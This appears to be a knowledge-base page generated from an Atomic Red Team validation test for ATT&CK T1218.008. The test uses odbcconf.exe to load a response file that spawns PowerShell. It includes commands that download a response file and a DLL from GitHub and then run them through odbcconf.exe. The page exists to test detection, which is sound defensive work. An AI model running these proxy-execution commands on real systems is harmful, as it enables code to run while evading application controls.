---
atomic_guid: "331ce274-f9c9-440b-9f8c-a1006e1fce0b"
title: "Odbcconf.exe - Load Response File"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218.008"
attack_technique_name: "Signed Binary Proxy Execution: Odbcconf"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.008/T1218.008.yaml"
build_date: "2026-04-27 19:12:27"
executor: "command_prompt"
aliases:
  - "331ce274-f9c9-440b-9f8c-a1006e1fce0b"
  - "Odbcconf.exe - Load Response File"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Execute arbitrary response file that will spawn PowerShell.exe.
Source files: https://github.com/woanware/application-restriction-bypasses

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218008-odbcconf|T1218.008: Odbcconf]]

## Input Arguments

### rsp_file_name

- description: Response file name to load
- type: string
- default: T1218.008.rsp

### rsp_file_path

- description: Response file path
- type: string
- default: PathToAtomicsFolder\T1218.008\bin\

## Dependencies

T1218.008.rsp must exist on disk at specified location (#{rsp_file_path}#{rsp_file_name})

### Prerequisite Check

```powershell
if (Test-Path "#{rsp_file_path}#{rsp_file_name}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/T1218.008.rsp" -OutFile "#{rsp_file_path}#{rsp_file_name}"
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/o.dll" -OutFile "#{rsp_file_path}\o.dll"
```

## Executor

- name: command_prompt

### Command

```cmd
cd "#{rsp_file_path}"
odbcconf.exe -f "#{rsp_file_name}"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.008/T1218.008.yaml)
